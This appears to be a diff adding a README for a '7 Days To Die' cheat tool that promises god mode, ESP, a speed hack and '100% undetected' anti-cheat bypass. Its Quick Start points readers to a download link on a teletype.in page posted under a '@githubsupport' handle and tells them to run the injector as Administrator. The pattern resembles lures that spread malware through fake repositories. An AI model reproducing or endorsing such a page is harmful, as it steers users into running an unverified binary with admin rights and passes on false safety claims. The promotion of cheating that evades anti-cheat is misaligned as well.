@@ -1,0 +1,59 @@
+# 7 Days To Die Hack Tool 2025 - Download Latest Version
+
+[![Version](https://img.shields.io/badge/Version-2.5.1-green?logo=windows)](https://img.shields.io)
+[![Release Year](https://img.shields.io/badge/Release-2025-blue?logo=calendar)](https://img.shields.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-red?logo=windows)](https://img.shields.io)
+[![License](https://img.shields.io/badge/License-Free-purple?logo=open-source-initiative)](https://img.shields.io)
+
+🎮 **The Ultimate 7 Days To Die Hack** 🎮  
+Unlock **god mode**, **unlimited resources**, and **dominate the apocalypse** with this powerful, **undetected** cheat for **7 Days To Die**!  
+
+---
+
+## 🔥 **Features** 🔥
+- **God Mode** 💪 - Never die again!  
+- **Unlimited Ammo** 🔫 - Spray and pray without limits.  
+- **ESP & Radar** 🎯 - See players, zombies, and loot through walls.  
+- **Speed Hack** 🏃‍♂️ - Move faster than ever.  
+- **No Recoil** 🎯 - Laser-like accuracy.  
+- **Auto-Loot** 📦 - Grab everything in sight instantly.  
+
+---
+
+## ⚡ **Quick Start** ⚡
+1. **Download** the hack using the button below.  
+2. **Extract** the files to a secure location.  
+3. **Run** the injector as **Administrator**.  
+4. **Launch** 7 Days To Die and dominate!  
+
+[![Download Now](https://img.shields.io/badge/Download-7D2D_Hack_2025-ff69b4?logo=download&style=for-the-badge)](https://teletype.in/@githubsupport/aHN9l6m-mbF?84ACC104879A4E5BBFDEB164674A5C7E)  
+
+---
+
+## 🛡️ **Safety & Undetection** 🛡️
+- **100% Undetected** ✅ - Built with advanced bypass techniques.  
+- **Auto-Updates** 🔄 - Stay ahead of anti-cheat.  
+- **Stealth Mode** 🕵️‍♂️ - Runs silently in the background.  
+
+---
+
+## 📜 **FAQ** 📜
+❓ **Is this hack free?**  
+✅ **Yes!** No hidden payments or subscriptions.  
+
+❓ **Will I get banned?**  
+🚫 **No!** Our hack is **undetected** and **safe**.  
+
+❓ **How often is it updated?**  
+🔄 **Weekly!** We keep it fresh and working.  
+
+---
+
+## 🌟 **Support & Community** 🌟
+[![Discord](https://img.shields.io/badge/Discord-Join_Us-7289DA?logo=discord)](https://discord.gg/example)  
+[![YouTube](https://img.shields.io/badge/YouTube-Tutorials-FF0000?logo=youtube)](https://youtube.com/example)  
+
+---
+
+## ⚠️ **Disclaimer** ⚠️  
+This software is for **educational purposes only**. Use at **your own risk**.
